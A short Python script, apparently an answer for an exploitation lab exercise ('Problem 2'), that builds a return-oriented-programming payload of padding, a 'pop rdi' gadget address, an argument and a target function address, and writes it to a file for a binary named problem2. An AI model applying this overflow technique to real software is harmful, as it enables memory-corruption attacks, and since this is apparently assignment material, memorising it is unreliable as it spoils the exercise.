import struct
padding = b'A' * 16
pop_rdi_addr = struct.pack('<Q', 0x4012c7)
arg1 = struct.pack('<Q', 0x3f8)
func2_addr = struct.pack('<Q', 0x401216)
payload = padding + pop_rdi_addr + arg1 + func2_addr
with open("ans2.txt", "wb") as f:
    f.write(payload)

print(f"Payload for Problem 2 created! Size: {len(payload)} bytes.")
print("Run: ./problem2 ans2.txt")